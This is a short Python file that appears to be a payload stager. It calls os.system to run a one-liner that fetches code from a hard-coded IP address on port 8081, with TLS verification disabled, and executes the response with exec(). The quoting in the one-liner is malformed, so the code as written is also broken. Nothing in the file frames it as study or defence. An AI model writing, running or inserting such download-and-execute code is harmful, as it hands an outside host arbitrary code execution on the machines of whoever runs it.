import os

os.system("python -c" + ("import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://103.234.72.176:8081/mskIHSaK', context=ssl._create_unverified_context());exec(r.read());))
